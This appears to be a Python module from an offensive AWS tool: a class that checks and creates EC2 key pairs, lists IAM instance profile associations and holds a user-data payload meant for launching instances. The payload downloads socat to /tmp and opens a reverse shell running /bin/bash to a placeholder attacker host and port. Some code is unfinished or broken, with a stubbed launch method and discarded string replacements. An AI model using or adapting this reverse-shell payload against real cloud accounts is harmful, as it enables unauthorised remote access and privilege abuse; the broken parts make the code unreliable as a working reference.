from botocore.exceptions import ClientError
from os import mkdir

class Ec2():

    def __init__(self, session, console):
        self.client = session.client("ec2")
        self.console = console
        self.user_data_payload = f"curl -o /tmp/socat https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat" \
        " && /tmp/socat tcp4:<rhost>:<rport> exec:/bin/bash"
    
    def _create_key_pair(self, key_name):
        def _create(key_name, dry=True):
            try:
                if not dry:
                    self.console.log(f"Creating key pair named `{key_name}`.. ([bold purple]ATTENTION[/bold purple])")
                    key_pair = self.client.create_key_pair(
                        KeyName=key_name,
                        DryRun=dry
                    )
                    self.console.log("Creating directory: `keys` ([bold blue]CREATED DIRECTORY[/bold blue]) ")
                    mkdir("./keys")
                    with open(f"./keys/{key_name}.pem", "w") as priv_key:
                        self.console.log(f"Writing PEM key to file: `./keys/{key_name}.pem`.. ([bold blue]CREATED FILE[/bold blue])")
                        priv_key.write(key_pair["KeyMaterial"])
                else:
                    self.client.create_key_pair(
                        KeyName=key_name,
                        DryRun=dry
                    )
            except ClientError as e:
                if "DryRunOperation" in str(e):
                    return True
                else:
                    return False

        success = _create(key_name)
        if success:
            self.console.log("You have the required permissions to create a key pair ([green]SUCCESS[/green])")
            if y_n := input("Would you like to create the key pair? (y/n): ").strip().lower() == "y":
                _create(key_name, dry=False)
            else:
                self.console.print("Adios...")
                exit(1)
        else:
            self.console.print("You do not have the required permission to create a key pair ([red]OPERATIONE FAILED[/red])")

    def _run_instance(
        self, key_name, instance_type):
        pass

    def launch_ec2_instance_profile(
        self, key_name, instance_profile_arn):
        self._create_key_pair(key_name)
        self._run_instance(key_name)

    def user_data_rev_shell(self, rhost, rport):
        self.user_data_payload.replace("<rhost>", rhost)
        self.user_data_payload.replace("<rport>", rport)

    def get_instance_profiles(self):
        instance_ids = []
        profiles = []
        for profile in self.client.describe_iam_instance_profile_associations()["IamInstanceProfileAssociations"]:
            instance_ids.append(profile["InstanceId"])
            profiles.append(profile["IamInstanceProfile"]["Arn"])
        return list(zip(instance_ids, profiles))
